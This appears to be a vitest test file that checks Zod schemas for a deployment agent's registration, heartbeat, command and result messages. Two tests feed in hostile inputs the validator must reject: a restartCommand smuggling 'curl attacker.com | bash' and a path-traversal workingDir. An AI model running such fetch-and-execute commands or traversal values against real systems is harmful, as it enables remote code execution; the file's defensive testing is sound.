import { describe, it, expect } from 'vitest'
import {
  AgentStatusSchema,
  AgentSchema,
  AgentRegisterRequestSchema,
  AgentRegisterResponseSchema,
  AgentHeartbeatSchema,
  AgentCommandSchema,
  AgentResultSchema,
} from '../agent.js'

describe('AgentStatusSchema', () => {
  it('parses all valid statuses', () => {
    expect(AgentStatusSchema.parse('idle')).toBe('idle')
    expect(AgentStatusSchema.parse('busy')).toBe('busy')
    expect(AgentStatusSchema.parse('offline')).toBe('offline')
  })

  it('rejects invalid status', () => {
    expect(AgentStatusSchema.safeParse('ready').success).toBe(false)
  })
})

describe('AgentSchema', () => {
  const validAgent = {
    id: crypto.randomUUID(),
    nodeId: crypto.randomUUID(),
    vmid: 100,
    hostname: 'skyblock-api-01',
    bundleHash: 'abc123deadbeef',
    kind: 'deploy',
    status: 'idle',
    lastSeenAt: new Date().toISOString(),
    registeredAt: new Date().toISOString(),
  }

  it('parses a valid agent', () => {
    expect(AgentSchema.safeParse(validAgent).success).toBe(true)
  })

  it('rejects non-positive vmid', () => {
    const result = AgentSchema.safeParse({ ...validAgent, vmid: 0 })
    expect(result.success).toBe(false)
    if (!result.success) {
      expect(result.error.issues[0]?.path).toContain('vmid')
    }
  })
})

describe('AgentRegisterRequestSchema', () => {
  it('parses a valid register request', () => {
    const result = AgentRegisterRequestSchema.safeParse({
      nodeId: crypto.randomUUID(),
      vmid: 100,
      hostname: 'host-01',
      bundleHash: 'abc123deadbeef',
      secret: 'a'.repeat(32),
    })
    expect(result.success).toBe(true)
  })

  it('rejects secret shorter than 32 chars', () => {
    const result = AgentRegisterRequestSchema.safeParse({
      nodeId: crypto.randomUUID(),
      vmid: 100,
      hostname: 'host-01',
      bundleHash: 'abc123deadbeef',
      secret: 'tooshort',
    })
    expect(result.success).toBe(false)
    if (!result.success) {
      expect(result.error.issues[0]?.path).toContain('secret')
    }
  })
})

describe('AgentRegisterResponseSchema', () => {
  it('parses a valid register response', () => {
    const result = AgentRegisterResponseSchema.safeParse({
      agentId: crypto.randomUUID(),
      token: 'eyJhbGciOiJIUzI1NiJ9.test.sig',
    })
    expect(result.success).toBe(true)
  })
})

describe('AgentHeartbeatSchema', () => {
  it('parses a heartbeat with no current job', () => {
    const result = AgentHeartbeatSchema.safeParse({
      agentId: crypto.randomUUID(),
      status: 'idle',
      currentJobId: null,
      timestamp: new Date().toISOString(),
    })
    expect(result.success).toBe(true)
  })

  it('parses a heartbeat with a current job', () => {
    const result = AgentHeartbeatSchema.safeParse({
      agentId: crypto.randomUUID(),
      status: 'busy',
      currentJobId: crypto.randomUUID(),
      timestamp: new Date().toISOString(),
    })
    expect(result.success).toBe(true)
  })
})

describe('AgentCommandSchema', () => {
  it('parses a deploy command', () => {
    const result = AgentCommandSchema.safeParse({
      type: 'deploy',
      jobId: crypto.randomUUID(),
      workingDir: '/opt/app',
      restartCommand: 'systemctl restart app',
      timeoutSeconds: 300,
      commitSha: 'b'.repeat(40),
    })
    expect(result.success).toBe(true)
  })

  it('rejects deploy command with short commitSha', () => {
    const result = AgentCommandSchema.safeParse({
      type: 'deploy',
      jobId: crypto.randomUUID(),
      workingDir: '/opt/app',
      restartCommand: 'systemctl restart app',
      timeoutSeconds: 300,
      commitSha: 'abc',
    })
    expect(result.success).toBe(false)
  })

  it('rejects deploy command with non-hex commitSha', () => {
    const result = AgentCommandSchema.safeParse({
      type: 'deploy',
      jobId: crypto.randomUUID(),
      workingDir: '/opt/app',
      restartCommand: 'systemctl restart app',
      timeoutSeconds: 300,
      commitSha: 'G'.repeat(40),
    })
    expect(result.success).toBe(false)
  })

  it('rejects deploy command with shell metacharacter in restartCommand', () => {
    const result = AgentCommandSchema.safeParse({
      type: 'deploy',
      jobId: crypto.randomUUID(),
      workingDir: '/opt/app',
      restartCommand: 'systemctl restart app; curl attacker.com | bash',
      timeoutSeconds: 300,
      commitSha: 'a'.repeat(40),
    })
    expect(result.success).toBe(false)
  })

  it('rejects deploy command with relative workingDir', () => {
    const result = AgentCommandSchema.safeParse({
      type: 'deploy',
      jobId: crypto.randomUUID(),
      workingDir: 'opt/app',
      restartCommand: 'systemctl restart app',
      timeoutSeconds: 300,
      commitSha: 'a'.repeat(40),
    })
    expect(result.success).toBe(false)
  })

  it('rejects deploy command with path traversal in workingDir', () => {
    const result = AgentCommandSchema.safeParse({
      type: 'deploy',
      jobId: crypto.randomUUID(),
      workingDir: '/opt/app/../../etc',
      restartCommand: 'systemctl restart app',
      timeoutSeconds: 300,
      commitSha: 'a'.repeat(40),
    })
    expect(result.success).toBe(false)
  })

  it('parses a cancel command', () => {
    const result = AgentCommandSchema.safeParse({
      type: 'cancel',
      jobId: crypto.randomUUID(),
    })
    expect(result.success).toBe(true)
  })

  it('parses a ping command', () => {
    const result = AgentCommandSchema.safeParse({ type: 'ping' })
    expect(result.success).toBe(true)
  })

  it('rejects unknown command type', () => {
    const result = AgentCommandSchema.safeParse({ type: 'restart' })
    expect(result.success).toBe(false)
  })
})

describe('AgentResultSchema', () => {
  it('parses deploy_started result', () => {
    const result = AgentResultSchema.safeParse({
      type: 'deploy_started',
      jobId: crypto.randomUUID(),
      agentId: crypto.randomUUID(),
      timestamp: new Date().toISOString(),
    })
    expect(result.success).toBe(true)
  })

  it('parses deploy_log result', () => {
    const result = AgentResultSchema.safeParse({
      type: 'deploy_log',
      jobId: crypto.randomUUID(),
      seq: 0,
      stream: 'stdout',
      line: 'Pulling latest changes...',
      timestamp: new Date().toISOString(),
    })
    expect(result.success).toBe(true)
  })

  it('parses deploy_finished result', () => {
    const result = AgentResultSchema.safeParse({
      type: 'deploy_finished',
      jobId: crypto.randomUUID(),
      exitCode: 0,
      timestamp: new Date().toISOString(),
    })
    expect(result.success).toBe(true)
  })

  it('parses pong result', () => {
    const result = AgentResultSchema.safeParse({
      type: 'pong',
      agentId: crypto.randomUUID(),
      timestamp: new Date().toISOString(),
    })
    expect(result.success).toBe(true)
  })

  it('rejects unknown result type', () => {
    const result = AgentResultSchema.safeParse({ type: 'unknown_result' })
    expect(result.success).toBe(false)
  })
})
